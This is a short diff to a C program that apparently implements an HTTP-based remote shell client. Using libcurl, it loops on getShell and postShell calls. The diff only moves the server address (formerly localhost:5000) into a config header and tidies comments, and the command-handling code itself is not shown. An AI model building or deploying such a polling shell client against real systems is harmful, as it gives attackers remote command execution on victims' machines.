@@ -4,6 +4,7 @@
 #include <stdlib.h>
 #include <curl/curl.h>
 #include <string.h>
+#include "config.h"
 
 #ifdef _WIN32
 #include <windows.h>
@@ -11,8 +12,6 @@
 #else
 #include <unistd.h>
 #endif
-
-#define URL "http://localhost:5000"
 
 char *getShell(char *cmd);
 char *postShell(char *cmd);
@@ -24,7 +23,7 @@ struct ResponseData {
 	size_t size;
 };
 
-// Callback function to handle the response body
+/* Callback function to handle the response body */
 size_t write_callback(void *ptr, size_t size, size_t nmemb,
 		      struct ResponseData *data)
 {
@@ -52,13 +51,13 @@ int main(int argc, char *argv[])
 
 	char *previous = NULL;
 	char *output = NULL;
+
 	switch (argv[1][0]) {
 	case 'g':
 	case 'p':
 		while (1) {
 			output = (argv[1][0] == 'g') ? getShell(previous) :
 						       postShell(previous);
-			// output = postShell(previous);
 			if (previous != NULL) {
 				free(previous);
 				previous = NULL;
